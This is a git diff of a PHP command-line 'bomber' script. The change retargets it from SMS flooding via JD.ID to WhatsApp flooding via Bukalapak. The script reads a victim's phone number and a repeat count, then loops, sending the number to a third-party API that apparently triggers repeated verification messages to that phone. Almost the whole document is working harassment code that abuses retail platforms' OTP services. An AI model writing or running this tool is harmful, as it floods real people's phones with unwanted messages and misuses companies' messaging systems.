@@ -2,25 +2,16 @@
 error_reporting(0);
 /**
 # Copyright (c) 2018 IDSYSTEM404.
-# Name        : BOM SMS JD.ID
+# Name        : BOM WA BUKALAPAK
 # Author      : Wahyu Arif P
 # Version     : v1
-# Created 	  : 09 Mei 2018 | 15:20:12
-# Last Update : 09 Mei 2018 | 18:14:52
+# Created 	  : 5 November 2018 | 22:00:12
+# Last Update : 5 November 2018 | 22:04:52
 # "Hargai Copyright jangan di Ubah!" 
 						-Wahyu Arif P
 **/
-echo "\n\e[1;35m============================[ BOM SMS JD.ID ]==========================\e[0m\r\n";
-$banner     = "   
-\e[1;35m=====================================================================
-Feature :
-- Add input delay time.
-\e[1;35m=====================================================================\e[0m\n";
-
-print $banner;
+echo "\n\e[1;35m============================[ BOM WA BUKALAPAK ]==========================\e[0m\r\n";
 sleep(1);
-
-$authorceo = 'IDSYSTEM404 | BOM SMS JD.ID';
 
 echo "\nNomor 		: ";
 $no = trim(fgets(STDIN, 1024)); 
@@ -35,7 +26,7 @@ for ($x=1; $x<=$jumlah; $x++) {
 
 /** FUNCTION CURL **/
 $idsystem404 = curl_init();$idsystem404 = curl_init();
-        curl_setopt($idsystem404, CURLOPT_URL,"https://api.petaniilmu.com/api/api-bomsmsjdid.php?bomsms=".$no);
+        curl_setopt($idsystem404, CURLOPT_URL,"https://api.petaniilmu.com/api/api-bukalapak-wa.php?no=".$no);
         curl_setopt($idsystem404, CURLOPT_POST, 1);
         curl_setopt($idsystem404, CURLOPT_POSTFIELDS, 1);
         curl_setopt($idsystem404, CURLOPT_RETURNTRANSFER, true);
@@ -53,7 +44,7 @@ curl_close($idsystem404);
 		flush();
 		sleep($delay); /** Delay **/		
 	} else {
-		echo "$x. [\e[1;31m $authorceo \e[0m] | Nomor : [\e[1;34m $no \e[0m] [ \e[1;92mSUCCESS ]\e[0m\n";
+		echo "$x.] Nomor : [\e[1;34m $no \e[0m] [ \e[1;92mSUCCESS ]\e[0m\n";
 		flush();
 		sleep($delay); /** Delay **/
 	}
